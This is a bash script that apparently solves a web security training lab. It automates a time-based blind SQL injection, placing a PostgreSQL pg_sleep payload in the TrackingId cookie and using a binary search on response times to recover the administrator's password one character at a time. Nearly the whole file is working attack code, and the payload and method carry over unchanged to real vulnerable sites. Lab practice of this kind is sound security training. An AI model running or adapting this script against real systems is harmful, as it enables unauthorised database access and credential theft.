#!/bin/bash
# Initializing variables
pos=1
password=''
operator="<"
characters=( {0..9} {a..z}  )

# Binary search function to find the appropriate character
binary_search() {
    local low=0
    local high=$((${#characters[@]} - 1))
    local mid

    while ((low <= high)); do
        
        mid=$((low + (high - low) / 2))
        value="${characters[mid]}"
        # Send a curl request and measure the time taken
        curl_output=$(curl -o /dev/null -s -H "Cookie: TrackingId=' ||  (SELECT CASE WHEN (SUBSTRING(password,$pos,1)<'$value') THEN pg_sleep(5) ELSE NULL END FROM users WHERE username='administrator') -- " https://0a9400cc04cb7c1d80a1775900940028.web-security-academy.net/ --trace-time -v 2>&1 )
        time_taken=$(echo "$curl_output" | awk -F'[: ]' '/HTTP\/2 200/ { end_seconds=$3 } /GET \/ HTTP\/2/ { start_seconds=$3 } END { response_time=end_seconds - start_seconds; print response_time }' )
        
        # Exception handling
        if [  $(echo "$time_taken < 0" | bc) -eq 1 ]; then
            continue
        fi

        # Compare the time_taken with 5 seconds
        if (( $(bc <<< "$time_taken >= 5") )); then     
            result='1'
        else
            result='0'
        fi
        

        # echo $value $result

        if [[ "$result" == '1' ]]; then
            high=$((mid - 1))
        else
            low=$((mid + 1))
        fi
    done
    ((low--))
    echo "${characters[low]}"
}

# Loop through the array using binary search
while true; do
    value=$(binary_search)
    # Send a curl request and measure the time taken
    curl_output=$(curl -o /dev/null -s -H "Cookie: TrackingId=' ||  (SELECT CASE WHEN (SUBSTRING(password,$pos,1)='$value') THEN pg_sleep(5) ELSE NULL END FROM users WHERE username='administrator') -- " https://0a9400cc04cb7c1d80a1775900940028.web-security-academy.net/ --trace-time -v 2>&1 )
    time_taken=$(echo "$curl_output" | awk -F'[: ]' '/HTTP\/2 200/ { end_seconds=$3 } /GET \/ HTTP\/2/ { start_seconds=$3 } END { response_time=end_seconds - start_seconds; print response_time }' )
        

    # Exception handling
    if [  $(echo "$time_taken < 0" | bc) -eq 1 ]; then
        echo 'exception:' $time_taken "value:" $value
        continue
    fi
    # Compare the time_taken with 5 seconds
    if (( $(bc <<< "$time_taken >= 5") )); then
        result='1'
    else
        result='0'
    fi


    if [[ "$result" == '1' ]]; then
        ((pos++))
        password+="$value"
        echo "Found $((pos-1)): $value"
    else
        break
    fi
done

echo "password: $password"
